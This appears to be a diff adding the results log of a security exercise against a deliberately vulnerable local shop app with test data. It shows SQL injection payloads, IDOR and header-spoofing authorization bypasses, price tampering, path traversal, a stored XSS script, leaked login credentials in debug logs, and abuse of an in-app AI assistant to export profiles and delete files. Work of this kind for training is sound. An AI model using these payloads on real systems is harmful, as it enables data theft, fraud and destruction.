@@ -1,0 +1,397 @@
+Target: http://127.0.0.1:8066
+Tokens obtained: alice=5980da8a..., bob=f7c928f7..., staff=e7accb90...
+
+=== IDOR: anonymous read of bob's profile via /profile?id=2 ===
+HTTP 200
+[
+  {
+    "id": 2,
+    "name": "TEST_BOB",
+    "email": "bob@example.invalid",
+    "address": "TEST_ADDRESS_B"
+  }
+]
+
+=== SQLi: UNION SELECT in /profile?id= ===
+HTTP 200
+[
+  {
+    "id": 999,
+    "name": "INJECTED",
+    "email": "injected@example.invalid",
+    "address": "INJECTED_ADDRESS"
+  }
+]
+
+=== SQLi: boolean OR 1=1 in /profile?id= ===
+HTTP 200
+[
+  {
+    "id": 1,
+    "name": "TEST_ALICE",
+    "email": "alice@example.invalid",
+    "address": "TEST_ADDRESS_A"
+  },
+  {
+    "id": 2,
+    "name": "TEST_BOB",
+    "email": "bob@example.invalid",
+    "address": "TEST_ADDRESS_B"
+  }
+]
+
+=== SQLi: /search?q=' OR 1=1-- ===
+HTTP 200
+[
+  {
+    "id": 1,
+    "name": "TEST_ALICE",
+    "email": "alice@example.invalid",
+    "address": "TEST_ADDRESS_A"
+  },
+  {
+    "id": 2,
+    "name": "TEST_BOB",
+    "email": "bob@example.invalid",
+    "address": "TEST_ADDRESS_B"
+  }
+]
+
+=== IDOR: anonymous GET /orders returns every order ===
+HTTP 200
+[
+  {
+    "id": 1,
+    "owner": 1,
+    "product": "chair",
+    "price": 5000.0
+  },
+  {
+    "id": 2,
+    "owner": 2,
+    "product": "lamp",
+    "price": 1500.0
+  }
+]
+
+=== Business logic: alice buys chair for client-supplied price=1 ===
+HTTP 201
+{
+  "id": 3,
+  "owner": 1,
+  "product": "chair",
+  "price": 1
+}
+
+=== Business logic: bob buys lamp for negative price=-100 ===
+HTTP 201
+{
+  "id": 4,
+  "owner": 2,
+  "product": "lamp",
+  "price": -100
+}
+
+=== AuthZ: anonymous export with only X-Role: staff ===
+HTTP 200
+[
+  {
+    "id": 1,
+    "name": "TEST_ALICE",
+    "email": "alice@example.invalid",
+    "address": "TEST_ADDRESS_A"
+  },
+  {
+    "id": 2,
+    "name": "TEST_BOB",
+    "email": "bob@example.invalid",
+    "address": "TEST_ADDRESS_B"
+  }
+]
+
+=== AuthZ: alice (customer) exports profiles with X-Role: staff ===
+HTTP 200
+[
+  {
+    "id": 1,
+    "name": "TEST_ALICE",
+    "email": "alice@example.invalid",
+    "address": "TEST_ADDRESS_A"
+  },
+  {
+    "id": 2,
+    "name": "TEST_BOB",
+    "email": "bob@example.invalid",
+    "address": "TEST_ADDRESS_B"
+  }
+]
+
+=== AuthZ control: staff token without X-Role is rejected ===
+HTTP 403
+{
+  "error": "staff only"
+}
+
+=== IDOR: alice reads bob's receipt ===
+HTTP 200
+{
+  "content": "TEST_BOB receipt: lamp, 1500 RUB"
+}
+
+=== Path traversal: anonymous reads private/operator-note.txt ===
+HTTP 200
+{
+  "content": "TEST_ONLY_OPERATOR_SECRET"
+}
+
+=== AuthZ: anonymous assistant export_profiles ===
+HTTP 200
+[
+  {
+    "id": 1,
+    "name": "TEST_ALICE",
+    "email": "alice@example.invalid",
+    "address": "TEST_ADDRESS_A"
+  },
+  {
+    "id": 2,
+    "name": "TEST_BOB",
+    "email": "bob@example.invalid",
+    "address": "TEST_ADDRESS_B"
+  }
+]
+
+=== AuthZ: alice's assistant reads operator note ===
+HTTP 200
+{
+  "content": "TEST_ONLY_OPERATOR_SECRET"
+}
+
+=== SQLi/IDOR: assistant context with order_id=1 OR 1=1 ===
+HTTP 200
+{
+  "prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 1, \"owner\": 1, \"product\": \"chair\", \"price\": 5000.0}, {\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}, {\"id\": 3, \"owner\": 1, \"product\": \"chair\", \"price\": 1.0}, {\"id\": 4, \"owner\": 2, \"product\": \"lamp\", \"price\": -100.0}]\nОтзывы: []\nЗапрос пользователя: Покажи чек по заказу"
+}
+
+=== SQLi: UNION SELECT in assistant context ===
+HTTP 200
+{
+  "prompt": "Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\nПомоги пользователю обработать заказ.\nЗаказ: [{\"id\": 777, \"owner\": 2, \"product\": \"INJECTED_PRODUCT\", \"price\": 1}]\nОтзывы: []\nЗапрос пользователя: Покажи чек по заказу"
+}
+
+=== Stored XSS: anonymous review with script tag ===
+HTTP 201
+{
+  "saved": true
+}
+
+=== Stored XSS: /reviews/view returns unescaped HTML ===
+HTTP 200
+"<html><body><p><script>alert('pwned')</script></p></body></html>"
+
+=== Info leak: anonymous /debug/logs with bodies and headers ===
+HTTP 200
+[
+  {
+    "method": "GET",
+    "target": "/health",
+    "body": {},
+    "headers": {
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "curl/8.18.0",
+      "Accept": "*/*"
+    }
+  },
+  {
+    "method": "POST",
+    "target": "/login",
+    "body": {
+      "username": "alice",
+      "password": "learn-alice"
+    },
+    "headers": {
+      "Accept-Encoding": "identity",
+      "Content-Length": "48",
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "Python-urllib/3.14",
+      "Content-Type": "application/json",
+      "Connection": "close"
+    }
+  },
+  {
+    "method": "POST",
+    "target": "/login",
+    "body": {
+      "username": "bob",
+      "password": "learn-bob"
+    },
+    "headers": {
+      "Accept-Encoding": "identity",
+      "Content-Length": "44",
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "Python-urllib/3.14",
+      "Content-Type": "application/json",
+      "Connection": "close"
+    }
+  },
+  {
+    "method": "POST",
+    "target": "/login",
+    "body": {
+      "username": "staff",
+      "password": "learn-staff"
+    },
+    "headers": {
+      "Accept-Encoding": "identity",
+      "Content-Length": "48",
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "Python-urllib/3.14",
+      "Content-Type": "application/json",
+      "Connection": "close"
+    }
+  },
+  {
+    "method": "GET",
+    "target": "/profile?id=2",
+    "body": {},
+    "headers": {
+      "Accept-Encoding": "identity",
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "Python-urllib/3.14",
+      "Content-Type": "application/json",
+      "Connection": "close"
+    }
+  },
+  {
+    "method": "GET",
+    "target": "/profile?id=0%20UNION%20SELECT%20999%2C%27INJECTED%27%2C%27injected%40example.invalid%27%2C%27INJECTED_ADDRESS%27--",
+    "body": {},
+    "headers": {
+      "Accept-Encoding": "identity",
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "Python-urllib/3.14",
+      "Content-Type": "application/json",
+      "Connection": "close"
+    }
+  },
+  {
+    "method": "GET",
+    "target": "/profile?id=1%20OR%201%3D1",
+    "body": {},
+    "headers": {
+      "Accept-Encoding": "identity",
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "Python-urllib/3.14",
+      "Content-Type": "application/json",
+      "Connection": "close"
+    }
+  },
+  {
+    "method": "GET",
+    "target": "/search?q=%27%20OR%201%3D1--",
+    "body": {},
+    "headers": {
+      "Accept-Encoding": "identity",
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "Python-urllib/3.14",
+      "Content-Type": "application/json",
+      "Connection": "close"
+    }
+  },
+  {
+    "method": "GET",
+    "target": "/orders",
+    "body": {},
+    "headers": {
+      "Accept-Encoding": "identity",
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "Python-urllib/3.14",
+      "Content-Type": "application/json",
+      "Connection": "close"
+    }
+  },
+  {
+    "method": "POST",
+    "target": "/orders",
+    "body": {
+      "product": "chair",
+      "price": 1
+    },
+    "headers": {
+      "Accept-Encoding": "identity",
+      "Content-Length": "32",
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "Python-urllib/3.14",
+      "Content-Type": "application/json",
+      "X-Token": "5980da8aee6e46279f32af7a85ef80af",
+      "Connection": "close"
+    }
+  },
+  {
+    "method": "POST",
+    "target": "/orders",
+    "body": {
+      "product": "lamp",
+      "price": -100
+    },
+    "headers": {
+      "Accept-Encoding": "identity",
+      "Content-Length": "34",
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "Python-urllib/3.14",
+      "Content-Type": "application/json",
+      "X-Token": "f7c928f7949648a9963626339b17932e",
+      "Connection": "close"
+    }
+  },
+  {
+    "method": "GET",
+    "target": "/admin/export",
+    "body": {},
+    "headers": {
+      "Accept-Encoding": "identity",
+      "Host": "127.0.0.1:8066",
+      "User-Agent": "Python-urllib/3.14",
+      "Content-Type": "application/json",
+      "X-Role": "staff",
+      "Connection": "close"
+    }
+  },
+  {
+    "method": "GET",
+    "target": "/admin/export",
+    "
+
+=== Error leak: POST /orders without product ===
+HTTP 500
+{
+  "error": "'product'",
+  "type": "KeyError"
+}
+
+=== Error leak: /profile?id=abc ===
+HTTP 500
+{
+  "error": "no such column: abc",
+  "type": "OperationalError"
+}
+
+=== Error leak: /files traversal outside sandbox ===
+HTTP 500
+{
+  "error": "outside exercise sandbox",
+  "type": "ValueError"
+}
+
+=== Destructive: anonymous assistant delete_tree('.') ===
+HTTP 200
+{
+  "deleted": "."
+}
+
+=== After delete_tree: alice's receipt is gone ===
+HTTP 500
+{
+  "error": "[Errno 2] No such file or directory: '/tmp/itmo-practice-06-85u377e6/files/alice/receipt.txt'",
+  "type": "FileNotFoundError"
+}
